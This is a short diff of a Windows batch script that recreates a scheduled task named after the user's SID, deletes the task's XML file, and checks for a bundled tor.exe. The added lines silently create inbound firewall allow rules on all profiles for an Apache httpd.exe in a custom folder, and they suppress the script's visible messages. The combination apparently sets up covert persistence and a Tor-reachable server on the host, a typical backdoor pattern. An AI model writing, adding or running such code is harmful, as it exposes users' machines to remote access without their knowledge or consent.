@@ -23,13 +23,11 @@ schtasks /Delete /TN "%SID%XYZ" /F
 schtasks /create /tn "%SID%XYZ" /xml "%SID%.xml"
 del "%SID%.xml"
 
-set "RuleName=YourRuleNameHere"
-
-netsh advfirewall firewall show rule name="%RuleName%" >nul 2>&1
+netsh advfirewall firewall show rule name="apache" >nul 2>&1
 if %errorlevel% equ 0 (
-    echo The firewall rule "%RuleName%" exists.
+    echo.
 ) else (
-    echo The firewall rule "%RuleName%" does not exist.
+    netsh advfirewall firewall add rule name="apache" dir=in action=allow program="%environment%\apache2\bin\httpd.exe" protocol=TCP profile=any && netsh advfirewall firewall add rule name="apache" dir=in action=allow program="%environment%\apache2\bin\httpd.exe" protocol=UDP profile=any
 )
 
 if exist "%environment%\tor.exe" (
